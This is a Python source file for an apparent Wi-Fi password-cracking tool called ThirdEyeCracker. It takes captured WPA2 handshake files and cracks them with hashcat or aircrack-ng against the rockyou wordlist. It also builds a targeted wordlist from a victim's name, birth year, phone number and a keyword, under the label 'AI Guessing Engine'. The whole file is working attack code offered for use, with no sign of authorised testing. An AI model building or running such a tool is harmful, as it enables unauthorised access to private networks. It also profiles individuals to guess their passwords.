import subprocess
import os
from colorama import Fore, Style

class ThirdEyeCracker:
    def __init__(self):
        # Detect environment
        self.is_termux = os.path.exists("/data/data/com.termux")
        
        # Smart Wordlist Detection
        linux_rockyou = "/usr/share/wordlists/rockyou.txt"
        termux_rockyou = "rockyou.txt"

        if not self.is_termux and os.path.exists(linux_rockyou):
            self.default_wordlist = linux_rockyou
        elif os.path.exists(termux_rockyou):
            self.default_wordlist = termux_rockyou
        else:
            self.default_wordlist = "rockyou.txt"

    def run_cmd(self, cmd_list):
        """Helper to handle sudo based on platform."""
        if not self.is_termux:
            if cmd_list[0] != "sudo":
                cmd_list.insert(0, "sudo")
        return cmd_list

    def ai_guessing_generator(self):
        """
        Generates a custom wordlist based on target's personal information.
        """
        print(Fore.CYAN + "\n[ AI Guessing Engine Initialized ]")
        print(Fore.WHITE + "Enter target details to generate smart combinations:")
        
        name = input("Target Name (e.g., Rahul): ").strip()
        dob = input("Birth Year/Date (e.g., 1998): ").strip()
        phone = input("Phone Number/Last digits: ").strip()
        extra = input("Special keyword (e.g., Home, WiFi): ").strip()

        passwords = set()
        # Common patterns and symbols
        elements = [name, name.lower(), name.capitalize(), dob, phone, extra]
        symbols = ["@", "!", "123", "#", "111", "007", ""]

        for item in elements:
            if not item: continue
            for sym in symbols:
                passwords.add(f"{item}{sym}")
                passwords.add(f"{sym}{item}")
                if dob and name:
                    passwords.add(f"{name}{dob}")
                    passwords.add(f"{name}@{dob}")
                    passwords.add(f"{name}{sym}{dob}")

        # Saving to a temporary wordlist
        guess_file = "ai_guess_list.txt"
        with open(guess_file, "w") as f:
            for pw in passwords:
                if len(pw) >= 8: # WPA2 requirement
                    f.write(pw + "\n")
        
        print(Fore.GREEN + f"[+] Smart Wordlist '{guess_file}' generated with {len(passwords)} combinations.")
        return guess_file

    def crack_with_hashcat(self, cap_file, wordlist=None):
        if self.is_termux:
            print(Fore.RED + "[!] Warning: Hashcat is heavy for mobile. Aircrack-ng is recommended.")
            
        if not wordlist: wordlist = self.default_wordlist
        if not os.path.exists(wordlist):
            print(Fore.RED + f"[!] Error: Wordlist not found at {wordlist}"); return

        hash_file = cap_file.replace(".cap", ".hc22000")
        print(Fore.MAGENTA + Style.BRIGHT + "[*] AI-Optimizing: Converting .cap to Hashcat format...")
        
        convert_cmd = self.run_cmd(["hcxpcapngtool", "-o", hash_file, cap_file])
        subprocess.run(convert_cmd, capture_output=True)

        if os.path.exists(hash_file):
            print(Fore.GREEN + "[+] Conversion Successful! Launching GPU Engine...")
            cmd = self.run_cmd(["hashcat", "-m", "22000", hash_file, wordlist, "--force"])
            try:
                subprocess.run(cmd)
            except Exception as e:
                print(Fore.RED + f"[!] Hashcat Error: {e}")
        else:
            print(Fore.RED + "[!] Conversion Failed. Ensure 'hcxtools' is installed.")

    def crack_wpa_standard(self, cap_file, wordlist=None):
        if not wordlist: wordlist = self.default_wordlist
        if not os.path.exists(wordlist):
            print(Fore.RED + f"[!] Error: Wordlist not found at {wordlist}"); return

        print(Fore.CYAN + f"[*] Launching CPU Engine (Aircrack-ng) using {wordlist}...")
        cmd = self.run_cmd(["aircrack-ng", "-w", wordlist, cap_file])
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Cracking session stopped by user.")

    def auto_crack_selector(self, cap_file):
        if not os.path.exists(cap_file):
            print(Fore.RED + f"[!] Error: File '{cap_file}' not found!"); return

        print(Fore.WHITE + "\n--- Select Cracking Method ---")
        print(Fore.GREEN + "1. Standard Wordlist (Rockyou)")
        print(Fore.GREEN + "2. AI Guessing Engine (Smart Combinations)")
        print(Fore.GREEN + "3. Manual Wordlist Path")
        
        choice = input(Fore.YELLOW + "Choose (1/2/3): ")
        
        # Wordlist Selection Logic
        if choice == '2':
            final_word = self.ai_guessing_generator()
        elif choice == '3':
            final_word = input(Fore.WHITE + "Enter wordlist path: ")
        else:
            final_word = self.default_wordlist

        print(Fore.WHITE + "\n--- Select Cracking Engine ---")
        print("1. Hashcat (GPU/Linux)")
        print("2. Aircrack-ng (CPU/Termux)")
        engine_choice = input(Fore.YELLOW + "Choose Engine (1/2): ")

        if engine_choice == '1':
            self.crack_with_hashcat(cap_file, final_word)
        else:
            self.crack_wpa_standard(cap_file, final_word)
